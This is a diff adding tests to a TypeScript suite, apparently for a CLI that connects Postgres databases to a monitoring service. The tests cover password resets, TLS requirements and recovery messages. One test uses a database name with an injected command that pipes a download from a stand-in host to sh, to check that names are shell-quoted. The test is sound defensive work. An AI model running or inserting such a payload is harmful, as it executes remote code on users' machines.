@@ -945,6 +945,14 @@ describe("connect on the paid path: the price before the box", () => {
     );
   });
 
+  test("--reset-password next to a box being deleted only: not refused, nothing of it is cut off", async () => {
+    const { deps } = make({}, { list: async () => [row("deleting_launched", FIRST)] });
+    const seen: unknown[] = [];
+    deps.prepare = async (_u, _p, o) => { seen.push(o); return { next: "stop" }; };
+    await connect(SH, { waitMs: 0, yes: true, resetPassword: true }, deps);
+    expect(seen).toEqual([{ resetPassword: true, check: true }]);
+  });
+
   test("the prepare step is told the server's other databases where the platform keeps the password, to name them in a refusal", async () => {
     const third = row("active", { id: "i-9", name: "db.example.com/third", provider: "self-managed", host_metrics: false });
     const { deps } = make({}, { list: async () => [row("active", FIRST), third] });
@@ -1030,7 +1038,16 @@ describe("prepareDatabase (a fake pg client)", () => {
         if (answer !== "ok") throw answer;
       }
       async query(sql: string) {
-        if (/session_user as name/.test(sql)) return { rows: [{ name: "postgres", db: "app", admin: true, iterations: "4096", ...me }] };
+        if (/session_user as name/.test(sql)) {
+          // Only the columns the SQL selects, each from what it is: a column dropped from the query is missing here too.
+          const row: Record<string, unknown> = { name: "postgres", db: "app", admin: true, iterations: "4096", ...me };
+          const selects: Record<string, RegExp> = {
+            name: /session_user as name/, db: /current_database\(\) as db/, admin: /\) as admin\b/,
+            mon_exists: /rolname = 'postgres_ai_mon'\) as mon_exists/, iterations: /current_setting\('scram_iterations', true\) as iterations/,
+            ssl: /current_setting\('ssl'\) as ssl/,
+          };
+          return { rows: [Object.fromEntries(Object.entries(selects).filter(([, re]) => re.test(sql)).map(([k]) => [k, row[k]]))] };
+        }
         if (this.user !== "postgres_ai_mon" && !/statement_timeout/.test(sql)) ran.push(sql.trim().split("\n")[0]);
         if (this.user !== "postgres_ai_mon" && !/session_user as name|statement_timeout/.test(sql)) sqls.push(sql);
         if (me.fails?.test(sql)) throw pgError("42501", "permission denied");
@@ -1114,6 +1131,7 @@ describe("prepareDatabase (a fake pg client)", () => {
     ["?sslmode=require&", "no stray &"],
     ["?application_name=a&application_name=b&sslmode=require", "application_name once"],
     ["?application_name=a&application_name=b&sslmode=prefer&", `${SSLMODE} and application_name once and no stray &`],
+    ["?application%5Fname=x&sslmode=require", "the parameter names without %-escapes"],
   ])(
     "the platform's stored password goes only over TLS, as the platform checks the URL: %p is refused before anything runs, with what it lacks",
     async (query, needs) => {
@@ -1154,10 +1172,36 @@ describe("prepareDatabase (a fake pg client)", () => {
     expect(s.ran).toEqual([]);
   });
 
-  test("an agent's URL on a server without TLS: the agent's way out", async () => {
+  test("an agent's URL on a server without TLS: the agent's way out, also where nobody has the password", async () => {
     const s = server({ mon_exists: true, ssl: "off" });
     expect(await s.prepare({ ...OTHERS, agent: true }, `${PLAIN}?sslmode=disable`)).toEqual({
-      next: `postgres_ai_mon already exists on this server, but ${NO_TLS}. Pass its URL as database_url, or run pgai connect in a terminal with PGAI_MON_PASSWORD set to its password`,
+      next: `postgres_ai_mon already exists on this server, but ${NO_TLS}. Pass its URL as database_url, or run pgai connect in a terminal with PGAI_MON_PASSWORD set to its password. If nobody has it, in a terminal: pgai disconnect db.example.com/first --yes, then pgai connect <admin-url> --reset-password with PGAI_MON_PASSWORD set to a new one (and connect db.example.com/first again with it)`,
+    });
+    expect(((await s.prepare({ storedPassword: true, agent: true }, `${PLAIN}?sslmode=disable`)) as { next: string }).next).toEndWith(
+      "If nobody has it, in a terminal: pgai disconnect the server's other databases (pgai databases), then pgai connect <admin-url> --reset-password with PGAI_MON_PASSWORD set to a new one (and connect them again with it)",
+    );
+    expect(s.ran).toEqual([]);
+  });
+
+  test("names the way out tells the user to type are quoted where a shell would read them", async () => {
+    const s = server({ name: "no-tls", mon_exists: true });
+    const others = ["[2001:db8::1]:5432/app", "db.example.com/x;curl -s https://evil.example/p|sh;#", "db.example.com/it's"];
+    expect(((await withMonPassword(undefined, () => s.prepare({ storedPassword: true, others }, PLAIN))) as { next: string }).next).toEndWith(
+      "If nobody has the password: pgai disconnect '[2001:db8::1]:5432/app' --yes and pgai disconnect 'db.example.com/x;curl -s https://evil.example/p|sh;#' --yes and pgai disconnect 'db.example.com/it'\\''s' --yes, then re-run with --reset-password and PGAI_MON_PASSWORD set to a new one (and connect [2001:db8::1]:5432/app, db.example.com/x;curl -s https://evil.example/p|sh;#, db.example.com/it's again with it)",
+    );
+  });
+
+  test("a TLS session to a server whose ssl setting is off (a pooler that ends TLS, say): the stored password is used", async () => {
+    const s = server({ mon_exists: true, ssl: "off" });
+    expect(await withMonPassword(undefined, () => s.prepare(OTHERS, `${PLAIN}?sslmode=require`))).toEqual({
+      monitoringUrl: "postgresql://postgres_ai_mon@db.example.com:5432/app?sslmode=require", storedPassword: true,
+    });
+  });
+
+  test("a server without TLS and a PGAI_MON_PASSWORD this host may not check (pg_hba): not told to unset it", async () => {
+    const s = server({ mon_exists: true, ssl: "off" }, [pgError("28000", "no pg_hba.conf entry for host")]);
+    expect(await withMonPassword("its-password", () => s.prepare(OTHERS, `${PLAIN}?sslmode=disable`))).toEqual({
+      next: "postgres_ai_mon already exists on this server, and PGAI_MON_PASSWORD could not be checked from this host (no pg_hba.conf entry for host). Run pgai connect from a host that postgres_ai_mon may connect from",
     });
   });
 
